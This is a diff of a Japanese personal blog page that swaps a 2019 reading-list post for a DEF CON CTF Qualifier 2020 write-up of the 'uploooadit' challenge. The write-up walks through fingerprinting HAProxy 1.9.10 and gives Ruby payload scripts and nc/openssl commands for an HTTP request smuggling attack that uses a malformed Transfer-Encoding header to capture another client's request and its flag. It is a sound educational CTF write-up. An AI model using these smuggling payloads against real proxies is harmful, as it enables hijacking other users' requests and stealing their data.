@@ -29,7 +29,7 @@
 
 
 
-<meta property="og:updated_time" content="2019-12-30T09:00:00&#43;09:00"/>
+<meta property="og:updated_time" content="2020-05-18T23:00:00&#43;09:00"/>
 
 
 
@@ -175,6 +175,10 @@ ga('send', 'pageview');
 
                 
                     <li>
+                        <a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/"><p>DEF CON CTF Qualifier 2020 uploooadit WriteUp</p></a>
+                    </li>
+                
+                    <li>
                         <a href="https://blog.s-tajima.work/post/2019/input-output/"><p>2019年のインプット・アウトプットまとめ</p></a>
                     </li>
                 
@@ -188,10 +192,6 @@ ga('send', 'pageview');
                 
                     <li>
                         <a href="https://blog.s-tajima.work/post/2018/smart-contract-write-up/"><p>CODE BLUE 2018 Smart Contract Hacking Challenge WriteUp</p></a>
-                    </li>
-                
-                    <li>
-                        <a href="https://blog.s-tajima.work/post/2018/shell2http-on-fargate/"><p>shell2httpでAWS FargateやSSHレスの運用を少しだけ楽にする</p></a>
                     </li>
                 
             </ul>
@@ -208,7 +208,7 @@ ga('send', 'pageview');
     <header>
     <div class="title">
         
-            <h2><a href="https://blog.s-tajima.work/post/2019/input-output/">2019年のインプット・アウトプットまとめ</a></h2>
+            <h2><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></h2>
         
         
     </div>
@@ -218,8 +218,8 @@ ga('send', 'pageview');
         
 
         <time class="published"
-            datetime='2019-12-30'>
-            December 30, 2019</time>
+            datetime='2020-05-18'>
+            May 18, 2020</time>
         <span class="author">Satoshi Tajima</span>
         
         
@@ -232,117 +232,170 @@ ga('send', 'pageview');
     <div id="content">
         
 
-<p>残念ながら今年はこのブログをあんまり更新できなかったので、せめてこれくらいはということで2019年のインプットとアウトプットについてまとめておく。 ( なお、会社の業務としてやったことはパブリックにしたもの以外は割愛。)</p>
+<p>2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、<br />
+welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。</p>
 
-<h1 id="インプット">インプット</h1>
+<p>最初の2つはチュートリアルなので割愛して、uploooaditのWriteUpを書きます。</p>
 
-<h2 id="本">本</h2>
-
-<p>今年から通勤時の電車移動の時間が少し増えたのと、<a href="https://finatext.com/ja/career/support">会社の学習支援の制度</a> の活用のために、例年より多くの本を読んだ。エンジニアなので技術書を読むのはあたりまえとして、最近は組織論とかマネジメント論についてもう少し体系だって考えたり語ったりできるようににならないとだめだなと感じることが増えたので、その手の本も読んだ。<br />
-読んだ本の一覧はこちら。</p>
+<h1 id="ソースコードを確認">ソースコードを確認</h1>
 
 <ul>
-<li><a href="https://amzn.to/2MH1xdE">サイバーセキュリティテスト完全ガイド　Kali Linuxによるペネトレーションテスト</a></li>
-<li><a href="https://amzn.to/2MBZmI0">サイバーセキュリティ レッドチーム実践ガイド</a></li>
-<li><a href="https://amzn.to/2tWI0iE">OAuth徹底入門 セキュアな認可システムを適用するための原則と実践</a></li>
-<li><a href="https://amzn.to/365gduM">Cloud Native Infrastructure: Patterns for Scalable Infrastructure and Applications in a Dynamic Environment (English Edition)</a></li>
-<li><a href="https://amzn.to/2stuwuk">LeanとDevOpsの科学［Accelerate］ テクノロジーの戦略的活用が組織変革を加速する impress top gearシリーズ</a></li>
-<li><a href="https://amzn.to/39jCUNI">Effective DevOps</a></li>
-<li><a href="https://amzn.to/357gls4">セキュリティのためのログ分析入門 サイバー攻撃の痕跡を見つける技術 Software Design plus</a></li>
-<li><a href="https://amzn.to/355eiFb">Clean Architecture 達人に学ぶソフトウェアの構造と設計</a></li>
-<li><a href="https://amzn.to/2SAnZJ9">エンジニアのためのマネジメントキャリアパス</a></li>
-<li><a href="https://amzn.to/2ZymD2Z">プロダクションレディマイクロサービス</a></li>
-<li><a href="https://amzn.to/2MDz5sR">暗号技術のすべて</a></li>
-<li><a href="https://amzn.to/2SDFb07">ソフトウェア・ファースト</a></li>
-<li><a href="https://amzn.to/37kCuVE">経営者のための情報セキュリティQ&amp;A45</a></li>
-<li><a href="https://amzn.to/2SAGk8R">NO HARD WORK!　無駄ゼロで結果を出すぼくらの働き方</a></li>
-<li><a href="https://amzn.to/3679EIb">THE TEAM 5つの法則</a></li>
-<li><a href="https://amzn.to/39jyaHP">シリコンバレー式 最強の育て方 ―人材マネジメントの新しい常識 1on1ミーティング―</a></li>
-<li><a href="https://amzn.to/39l08D6">デッドライン</a></li>
-<li><a href="https://amzn.to/2F4Wrn4">最軽量のマネジメント</a></li>
-<li><a href="https://amzn.to/2Q9bYJ8">HIGH OUTPUT MANAGEMENT</a></li>
-<li><a href="https://amzn.to/369GSGH">1兆ドルコーチ――シリコンバレーのレジェンド　ビル・キャンベルの成功の教え</a></li>
-<li><a href="https://amzn.to/2tTXpjJ">企業変革力</a></li>
-<li><a href="https://amzn.to/37kXU52">反脆弱性［上］――不確実な世界を生き延びる唯一の考え方</a></li>
-<li><a href="https://amzn.to/39lWqcr">FACTFULNESS（ファクトフルネス）10の思い込みを乗り越え、データを基に世界を正しく見る習慣</a></li>
-<li><a href="https://amzn.to/2F12by7">アントフィナンシャル――1匹のアリがつくる新金融エコシステム</a></li>
-<li><a href="https://amzn.to/2MF3GX3">ジ・エンド・オブ・バンキング 銀行の終わりと金融の未来</a></li>
-</ul>
-
-<p>また、これらの本を積読中。年末年始に読みたい。</p>
+<li>Flaskで書かれたPythonのWebアプリケーション</li>
+<li>エンドポイントは以下の3つ
 
 <ul>
-<li><a href="https://amzn.to/2rCk0k5">チャイナ・ウェイ――中国ビジネスリーダーの経営スタイル</a></li>
-<li><a href="https://amzn.to/2thrQzZ">世界で闘うプログラミング力を鍛える本 コーディング面接189問とその解法</a></li>
-<li><a href="https://amzn.to/358Mv6y">レガシーコードからの脱却</a></li>
-<li><a href="https://amzn.to/2QrEsws">Design It!</a></li>
-<li><a href="https://amzn.to/2QpiM48">WTF経済</a></li>
+<li>GET / &hellip; 空のページです。</li>
+<li>POST /files/ &hellip; X-guidというリクエストヘッダに記載された文字列の通りのパスにファイルを保存します。</li>
+<li>GET /files/ &hellip; POST /files/ でアップロードしたファイルのコンテンツを返します。</li>
+</ul></li>
 </ul>
 
-<h2 id="podcast">Podcast</h2>
+<h1 id="稼働環境を確認">稼働環境を確認</h1>
 
-<p>主に英語のリスニング力のアップのために聞いている。
-タイミングとしては通勤の電車の中か、ジムにいるとき。</p>
+<p>普通にリクエストを投げてみて、HAProxy + gunicorn/20.0.0の構成ということがわかります。</p>
+
+<pre><code>$ curl -sv https://uploooadit.oooverflow.io/
+.. snip ..
+&lt; HTTP/1.1 204 NO CONTENT
+&lt; Server: gunicorn/20.0.0
+&lt; Date: Sat, 16 May 2020 13:05:18 GMT
+&lt; Content-Type: text/html; charset=utf-8
+&lt; Via: haproxy
+.. snip ..
+</code></pre>
+
+<p>今度はエラーになるようなリクエストを投げてみて、HAProxyのバージョンは1.9.10ということがわかります。<br />
+<a href="https://www.haproxy.org/download/1.9/src/CHANGELOG">https://www.haproxy.org/download/1.9/src/CHANGELOG</a> を見ると、2019/08/08のリリースと若干古いのが気になります。。</p>
+
+<pre><code>$ curl -sv https://uploooadit.oooverflow.io/あ
+&lt; HTTP/1.0 400 Bad request
+&lt; Server: haproxy 1.9.10
+&lt; Cache-Control: no-cache
+&lt; Connection: close
+&lt; Content-Type: text/html
+&lt;
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
+Your browser sent an invalid request.
+&lt;/body&gt;&lt;/html&gt;
+.. snip ..
+</code></pre>
+
+<p>SSRFやHTTP request smuggling的あたりができるのではと疑い、
+調べてみると HAProxy の HTTP request smuggling というそのまんまの記事が見つかります。</p>
 
 <ul>
-<li><a href="https://changelog.com/podcast">The Changelog</a></li>
-<li><a href="https://changelog.com/gotime">Go Time</a></li>
-<li><a href="https://www.redhat.com/en/command-line-heroes">COMMAND_LINE HEROES</a></li>
+<li><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">https://nathandavison.com/blog/haproxy-http-request-smuggling</a></li>
+<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li>
 </ul>
 
-<p>上記のPodcastは大体のエピソードを聞いてしまったので、来年はこのあたりを聞く予定。</p>
+<p>この時点でこんな仮設をたてました。</p>
 
 <ul>
-<li><a href="https://softwareengineeringdaily.com/category/all-episodes/exclusive-content/Podcast/">Software Engineering Daily</a></li>
+<li>フラグが含まれたObjectに対するアクセス、ないしはフラグをアップロードするアクセスが、定常的にリクエストされている。</li>
+<li>HTTP request smugglingによって、そのアクセスの内容を盗み取る必要がある。</li>
 </ul>
 
-<h2 id="イベント">イベント</h2>
+<h1 id="ローカルで検証環境の作成">ローカルで検証環境の作成</h1>
 
-<p>大きめのカンファレンスへの参加が多かった。</p>
+<p>適当に立ち上げたEC2上に&hellip;</p>
 
 <ul>
-<li><a href="https://aws.amazon.com/jp/summits/tokyo-2019/">AWS Summit Tokyo 2019</a></li>
-<li><a href="https://www.interop.jp/">Interop Tokyo 2019</a></li>
-<li><a href="https://www.blackhat.com/us-19/">BlackHat USA 2019</a></li>
-<li><a href="https://www.defcon.org/html/defcon-27/dc-27-index.html">DEF CON 27</a></li>
-<li><a href="https://linedevday.linecorp.com/jp/2019/">LINE DEVELOPER DAY 2019</a></li>
-<li><a href="https://cto-a.org/news/2019/11/20/288/">CTO Conference 2019 Winter</a></li>
+<li>HAProxyの1.9.10を用意 (ソースコードからコンパイル)</li>
+<li>gunicornを用意 (pipでインストール)</li>
+<li>提供された app.py, store.py を使用 (S3StoreはLocalStoreに切り替え)</li>
 </ul>
 
-<p>来年は久しぶりにre:Inventに行きたいなーと思っている。</p>
+<p>という形で環境をつくります。</p>
 
-<h1 id="アウトプット">アウトプット</h1>
-
-<h2 id="登壇">登壇</h2>
-
-<p>AWS Summit Tokyoで話をする機会をいただけた。<br />
-準備はなかなか大変だったけど、役に立ったと声をかけてもらえたりもしたのでよかった。</p>
+<p>そして、まずはRubyでこんなPayloadを作成。</p>
 
 <ul>
-<li><a href="https://aws.amazon.com/jp/blogs/startup/summit2019_day2_recap/">AWS Summit Tokyo 2019</a></li>
+<li>payload.rb</li>
 </ul>
 
-<h2 id="会社のテックブログ">会社のテックブログ</h2>
+<pre><code>payload = &lt;&lt;EOP
+POST /files/ HTTP/1.1\r
+Host: uploooadit.oooverflow.io\r
+X-guid: 11111111-2222-3333-1111-111111111112\r
+Content-Type: text/plain\r
+Content-Length: 4\r
+\r
+test\r
 
-<p>会社のテックブログを立ち上げて、いくつか記事を書いた。</p>
+EOP
+print payload 
+</code></pre>
+
+<p>こんな形でトライ&amp; エラーを繰り返せる状態を作ります。</p>
+
+<pre><code>$ ruby payload.rb | nc localhost 1080
+</code></pre>
+
+<p>tcpdumpも使い、パケットを見ながら調整していくと、こんな形でうまくいきそうなことがわかります。</p>
 
 <ul>
-<li><a href="https://medium.com/finatext/blackhat-usa-2019-defcon-27-b6ab7d1fdf00">Black Hat USA 2019 &amp; DEF CON 27 に参加してきました</a></li>
-<li><a href="https://medium.com/finatext/finatext-aws-guardrail-2705cd1e3679">FinatextにおけるAWSのガードレール戦略の紹介</a></li>
-<li><a href="https://medium.com/finatext/unifi-office-network-8421c518a546">UniFiで中規模オフィスネットワークをリーズナブルに構築した話</a></li>
+<li>payload.rb</li>
 </ul>
 
-<p>AWSのガードレール戦略の話はそこそこ多くの人に読んでもらえてよかったなと思う。一方、個人的にはあんまり話題にならずに流れてしまったUniFiでネットワーク構築した話のほうがすごいことをやったつもりなのでぜひこっちも読んだくださいという気持ち。</p>
+<pre><code>payload = &lt;&lt;EOP.chomp
+POST /files/ HTTP/1.1\r
+Host: uploooadit.oooverflow.io\r
+X-guid: 11111111-2222-3333-1111-111111111112\r
+Content-Type: text/plain\r
+Content-Length: 158\r
+Transfer-Encoding: \x0bchunked\r
+\r
+0\r
+\r
+POST /files/ HTTP/1.1\r
+Host: uploooadit.oooverflow.io\r
+X-guid: 11111111-2222-3333-1111-111111111119\r
+Content-Type: text/plain\r
+Content-Length: 388\r
+\r
+test
+EOP
 
-<h2 id="資格">資格</h2>
-
-<p>会社の取引先からのアセスメントシート等で、在籍者の資格保有状況についての確認項目があったりするので、取れそうなものは取ろうかなと思い受験した。(尚アウトプットのくくりにするのが正しいかどうかは微妙。)</p>
+print payload 
+sleep(10)
+</code></pre>
 
 <ul>
-<li><a href="https://aws.amazon.com/jp/certification/certified-security-specialty/">AWS Certified Security - Specialty</a></li>
+<li>コマンド</li>
 </ul>
 
-<p>来年はCISSPを取る予定でテキストを買ってある。</p>
+<pre><code class="language-bash">$ unbuffer ruby payload.rb | nc localhost 1080
+$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
+</code></pre>
+
+<h1 id="実環境でのトライ">実環境でのトライ</h1>
+
+<p>実際の環境はhttpsなので、ncをopenssl s_clientにし、かつ Content-Length も調整していき&hellip;<br />
+最終的に以下のようなコマンドにてリクエストを盗み見ることに成功。</p>
+
+<pre><code class="language-bash">$ unbuffer ruby payload.rb | openssl s_client -connect uploooadit.oooverflow.io:443
+$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
+</code></pre>
+
+<p>リクエストのBodyにFLAGがありました。</p>
+
+<pre><code>tesPOST /files/ HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: invoker
+Accept-Encoding: gzip, deflate
+Accept: */*
+Content-Type: text/plain
+X-guid: 85a290de-9877-4d90-82ea-fe0700a570b0
+Content-Length: 152
+X-Forwarded-For: 127.0.0.1
+
+Congratulations!
+OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
+</code></pre>
+
+<p>以上、久しぶりに参加したCTFのWriteUpでした。<br />
+いつもCTFは遊び参加で数問見てみて終わりみたいになるんだけど、<br />
+そろそろチームとか組んでがっつり時間確保して上位に入るのを目指すような参加をしたい。</p>
 
     </div>
 
@@ -381,43 +434,43 @@ ga('send', 'pageview');
             
 
 
-<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f&text=2019%e5%b9%b4%e3%81%ae%e3%82%a4%e3%83%b3%e3%83%97%e3%83%83%e3%83%88%e3%83%bb%e3%82%a2%e3%82%a6%e3%83%88%e3%83%97%e3%83%83%e3%83%88%e3%81%be%e3%81%a8%e3%82%81&via=s_tajima" target="_blank" class="share-btn twitter">
+<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&text=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp&via=s_tajima" target="_blank" class="share-btn twitter">
     <i class="fa fa-twitter"></i>
     <p>Twitter</p>
 </a></li>
 
 
-<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f" target="_blank" class="share-btn google-plus">
+<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn google-plus">
     <i class="fa fa-google-plus"></i>
     <p>Google+</p>
 </a></li>
 
 
-<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f" target="_blank" class="share-btn facebook">
+<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn facebook">
     <i class="fa fa-facebook"></i>
     <p>Facebook</p>
 </a></li>
 
 
-<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f&title=2019%e5%b9%b4%e3%81%ae%e3%82%a4%e3%83%b3%e3%83%97%e3%83%83%e3%83%88%e3%83%bb%e3%82%a2%e3%82%a6%e3%83%88%e3%83%97%e3%83%83%e3%83%88%e3%81%be%e3%81%a8%e3%82%81" target="_blank" class="share-btn reddit">
+<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn reddit">
     <i class="fa fa-reddit-alien"></i>
     <p>Reddit</p>
 </a></li>
 
 
-<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f&title=2019%e5%b9%b4%e3%81%ae%e3%82%a4%e3%83%b3%e3%83%97%e3%83%83%e3%83%88%e3%83%bb%e3%82%a2%e3%82%a6%e3%83%88%e3%83%97%e3%83%83%e3%83%88%e3%81%be%e3%81%a8%e3%82%81" target="_blank" class="share-btn linkedin">
+<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn linkedin">
     <i class="fa fa-linkedin"></i>
     <p>LinkedIn</p>
 </a></li>
 
 
-<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f&title=2019%e5%b9%b4%e3%81%ae%e3%82%a4%e3%83%b3%e3%83%97%e3%83%83%e3%83%88%e3%83%bb%e3%82%a2%e3%82%a6%e3%83%88%e3%83%97%e3%83%83%e3%83%88%e3%81%be%e3%81%a8%e3%82%81" target="_blank" class="share-btn stumbleupon">
+<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn stumbleupon">
     <i class="fa fa-stumbleupon"></i>
     <p>StumbleUpon</p>
 </a></li>
 
 
-<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f" target="_blank" class="share-btn email">
+<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn email">
     <i class="fa fa-envelope"></i>
     <p>Email</p>
 </a></li>
@@ -427,8 +480,8 @@ ga('send', 'pageview');
 </article>
 <ul class="actions pagination">
     
-        <li><a href="https://blog.s-tajima.work/post/2019/security-assessment/"
-                class="button big previous">セキュリティ診断で確認する項目</a></li>
+        <li><a href="https://blog.s-tajima.work/post/2019/input-output/"
+                class="button big previous">2019年のインプット・アウトプットまとめ</a></li>
     
 
     
@@ -447,43 +500,43 @@ ga('send', 'pageview');
             
 
 
-<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f&text=2019%e5%b9%b4%e3%81%ae%e3%82%a4%e3%83%b3%e3%83%97%e3%83%83%e3%83%88%e3%83%bb%e3%82%a2%e3%82%a6%e3%83%88%e3%83%97%e3%83%83%e3%83%88%e3%81%be%e3%81%a8%e3%82%81&via=s_tajima" target="_blank" class="share-btn twitter">
+<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&text=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp&via=s_tajima" target="_blank" class="share-btn twitter">
     <i class="fa fa-twitter"></i>
     <p>Twitter</p>
 </a></li>
 
 
-<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f" target="_blank" class="share-btn google-plus">
+<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn google-plus">
     <i class="fa fa-google-plus"></i>
     <p>Google+</p>
 </a></li>
 
 
-<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f" target="_blank" class="share-btn facebook">
+<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn facebook">
     <i class="fa fa-facebook"></i>
     <p>Facebook</p>
 </a></li>
 
 
-<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f&title=2019%e5%b9%b4%e3%81%ae%e3%82%a4%e3%83%b3%e3%83%97%e3%83%83%e3%83%88%e3%83%bb%e3%82%a2%e3%82%a6%e3%83%88%e3%83%97%e3%83%83%e3%83%88%e3%81%be%e3%81%a8%e3%82%81" target="_blank" class="share-btn reddit">
+<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn reddit">
     <i class="fa fa-reddit-alien"></i>
     <p>Reddit</p>
 </a></li>
 
 
-<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f&title=2019%e5%b9%b4%e3%81%ae%e3%82%a4%e3%83%b3%e3%83%97%e3%83%83%e3%83%88%e3%83%bb%e3%82%a2%e3%82%a6%e3%83%88%e3%83%97%e3%83%83%e3%83%88%e3%81%be%e3%81%a8%e3%82%81" target="_blank" class="share-btn linkedin">
+<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn linkedin">
     <i class="fa fa-linkedin"></i>
     <p>LinkedIn</p>
 </a></li>
 
 
-<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f&title=2019%e5%b9%b4%e3%81%ae%e3%82%a4%e3%83%b3%e3%83%97%e3%83%83%e3%83%88%e3%83%bb%e3%82%a2%e3%82%a6%e3%83%88%e3%83%97%e3%83%83%e3%83%88%e3%81%be%e3%81%a8%e3%82%81" target="_blank" class="share-btn stumbleupon">
+<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn stumbleupon">
     <i class="fa fa-stumbleupon"></i>
     <p>StumbleUpon</p>
 </a></li>
 
 
-<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2019%2finput-output%2f" target="_blank" class="share-btn email">
+<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn email">
     <i class="fa fa-envelope"></i>
     <p>Email</p>
 </a></li>
@@ -591,6 +644,20 @@ ga('send', 'pageview');
                     <li>
                         <article>
                             <header>
+                                <h3><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></h3>
+                                
+                                    
+                                
+                                <time class="published" datetime=
+                                    '2020-05-18'>
+                                    May 18, 2020</time>
+                            </header>
+                        </article>
+                    </li>
+                
+                    <li>
+                        <article>
+                            <header>
                                 <h3><a href="https://blog.s-tajima.work/post/2019/input-output/">2019年のインプット・アウトプットまとめ</a></h3>
                                 
                                     
@@ -644,20 +711,6 @@ ga('send', 'pageview');
                         </article>
                     </li>
                 
-                    <li>
-                        <article>
-                            <header>
-                                <h3><a href="https://blog.s-tajima.work/post/2018/shell2http-on-fargate/">shell2httpでAWS FargateやSSHレスの運用を少しだけ楽にする</a></h3>
-                                
-                                    
-                                
-                                <time class="published" datetime=
-                                    '2018-10-22'>
-                                    October 22, 2018</time>
-                            </header>
-                        </article>
-                    </li>
-                
 
                 
                     <li>
@@ -692,7 +745,7 @@ ga('send', 'pageview');
                         <article>
                             <header>
                                 <a href="/categories//"></a>
-                                <span style="float:right;">4</span>
+                                <span style="float:right;">5</span>
                             </header>
                         </article>
                     </li>
@@ -719,7 +772,7 @@ ga('send', 'pageview');
                         <article>
                             <header>
                                 <a href="/categories/ja/">ja</a>
-                                <span style="float:right;">11</span>
+                                <span style="float:right;">12</span>
                             </header>
                         </article>
                     </li>
